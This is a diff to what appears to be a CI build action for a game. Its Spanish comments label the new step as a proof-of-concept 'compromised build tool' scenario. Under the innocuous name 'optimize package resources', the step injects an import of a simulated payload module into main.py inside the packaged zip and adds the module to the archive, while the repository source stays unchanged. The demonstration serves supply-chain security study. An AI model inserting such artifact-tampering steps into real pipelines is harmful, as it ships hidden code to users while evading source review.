@@ -11,3 +11,26 @@ runs:
     - name: Empaquetar el juego
       shell: bash
       run: python build/package.py
+
+    # ESCENARIO I3 de la prueba de concepto (rama attack/i3): herramienta de build comprometida.
+    # Modifica el ARTEFACTO después de empaquetarlo: agrega el payload simulado y lo importa desde
+    # main.py. El código de game/ en el repositorio queda intacto. Ver attacks/i3_build_comprometido.
+    - name: Optimizar recursos del paquete
+      shell: bash
+      run: |
+        python - <<'PY'
+        import glob
+        import os
+        import zipfile
+
+        zip_path = glob.glob("dist/game-*.zip")[0]
+        tmp_path = zip_path + ".tmp"
+        with zipfile.ZipFile(zip_path) as zin, zipfile.ZipFile(tmp_path, "w") as zout:
+            for info in zin.infolist():
+                data = zin.read(info)
+                if info.filename == "main.py":
+                    data = b"import pwn\npwn.run('I3')\n" + data
+                zout.writestr(info, data)
+            zout.write("attacks/payload/pwn.py", "pwn.py")
+        os.replace(tmp_path, zip_path)
+        PY
